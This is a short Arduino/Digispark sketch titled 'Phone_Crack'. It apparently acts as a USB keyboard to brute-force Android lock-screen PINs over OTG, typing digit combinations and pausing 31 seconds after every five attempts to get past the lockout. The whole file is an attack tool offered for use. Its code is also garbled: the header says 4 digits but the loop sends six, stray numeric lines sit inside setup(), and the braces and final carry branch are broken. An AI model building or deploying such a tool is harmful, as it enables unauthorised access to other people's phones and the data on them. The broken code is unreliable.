

/*===============================================
Phone_Crack -  4 Digit PIN - Brute Force Attack on Android 
Smartphones that Supports OTG-Usb  
    AMH Tech Sl sco
===============================================*/

#include "DigiKeyboard.h"
int num[] = {39, 30, 31, 32, 33, 34, 35, 36, 37, 38};
int a = 0; //1st digit
int b = 0; //2nd digit
int c = 0; //3rd digit
int d = 0; //4th digit
int e = 0; //5th digit
int f = 0; //6th digit
int g = 0; //7th digit
int h = 0; //8th digit
int count = 0;
bool key_stroke_f = false;

void setup() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0); //this is generally not necessary but with some older systems it seems to prevent missing the first character after a delay000000
  000001
  000002
  000003
  000004

  
}

void loop() {

  //After 5 attempts, initialize 31000 ms wait to retry.
  if(count == 5){
    digitalWrite(1,HIGH); //Change this to 0 if using DigiSpark model B
    DigiKeyboard.sendKeyStroke(40); //we hit enter to make the popup go away
    delay(31000);
    count = 0;
    digitalWrite(1,LOW);
  }
  /*Sends keystrokes based upon the values between 0-9 
  It will start bruting 8 digits if a exceeds 10*/
  DigiKeyboard.sendKeyStroke(num[a]);
  DigiKeyboard.sendKeyStroke(num[b]);
  DigiKeyboard.sendKeyStroke(num[c]);
  DigiKeyboard.sendKeyStroke(num[d]);
  DigiKeyboard.sendKeyStroke(num[e]);
  DigiKeyboard.sendKeyStroke(num[f]);
  //check for whether it is true. If so, use 8 digits instead.
  if (key_stroke_f == true){
    DigiKeyboard.sendKeyStroke(num[g]);
    DigiKeyboard.sendKeyStroke(num[h]);
  }
  DigiKeyboard.sendKeyStroke(40);
  delay(1000);
  f++;
  count++; 
  if(f == 10){
    f = 0;
    e++;
    if(e == 10){
      e = 0;
      d++;
      if(d == 10){
        d = 0;
        c++;
        if(c == 10){
          c = 0;
          b++;
          if(b == 10){
            b = 0;
            a++; 
    if(a == 10){
      }
      }
      }
      }
    }}      }
